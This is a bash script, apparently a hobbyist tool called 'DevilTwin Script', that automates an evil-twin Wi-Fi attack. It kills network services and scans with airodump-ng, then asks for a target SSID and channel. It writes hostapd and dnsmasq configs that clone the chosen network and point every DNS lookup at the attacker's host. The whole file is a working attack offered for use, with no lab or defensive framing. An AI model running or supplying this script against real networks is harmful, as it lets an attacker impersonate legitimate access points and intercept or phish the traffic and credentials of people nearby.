#!/bin/bash

echo "****************************************"
echo "*                                      *"
echo "*      Welcome to DevilTwin Script!    *"
echo "*       Created by Abdullah XDev       *"
echo "*                                      *"
echo "****************************************"

# Script to perform DevilTwin attack setup with process killing

function list_wifi_adapters {
    echo "Available Wi-Fi adapters:"
    iw dev | grep Interface | awk '{print $2}'
    echo "---------------------------------"
}

function select_wifi_adapter {
    echo "Enter the Wi-Fi adapter to use (e.g., wlan0, wlan1):"
    read wifi_adapter
    echo "You selected: $wifi_adapter"
}

function kill_interfering_processes {
    echo "Killing interfering processes..."
    sudo airmon-ng check kill
    echo "Processes killed."
}

function start_network_scan {
    echo "Putting $wifi_adapter into monitor mode..."
    sudo airmon-ng start $wifi_adapter
    monitor_iface="${wifi_adapter}mon"
    echo "Scanning networks on $monitor_iface..."
    echo "Press CTRL+C to stop scanning and select a target network."
    sudo airodump-ng $monitor_iface
}

function stop_scan_and_select_target {
    echo
    echo "Scanning stopped. Please enter the SSID of the network to clone:"
    read target_ssid
    echo "Please enter the channel number of the target network:"
    read target_channel
}

function setup_fake_access_point {
    echo "Setting up fake access point with SSID: $target_ssid on channel: $target_channel"
    cat <<EOF > hostapd.conf
interface=$monitor_iface
driver=nl80211
ssid=$target_ssid
hw_mode=g
channel=$target_channel
EOF

    cat <<EOF > dnsmasq.conf
interface=$monitor_iface
dhcp-range=192.168.1.2,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
address=/#/192.168.1.1
EOF

    echo "Starting hostapd and dnsmasq..."
    sudo hostapd hostapd.conf &
    sudo dnsmasq -C dnsmasq.conf &
    echo "Fake access point is running."
}

function cleanup {
    echo "Cleaning up and restoring network settings..."
    sudo killall hostapd dnsmasq
    sudo airmon-ng stop $monitor_iface
    sudo systemctl start NetworkManager
    echo "Cleanup complete."
}

# Main script execution
trap cleanup EXIT

list_wifi_adapters
select_wifi_adapter
kill_interfering_processes
start_network_scan
stop_scan_and_select_target
setup_fake_access_point

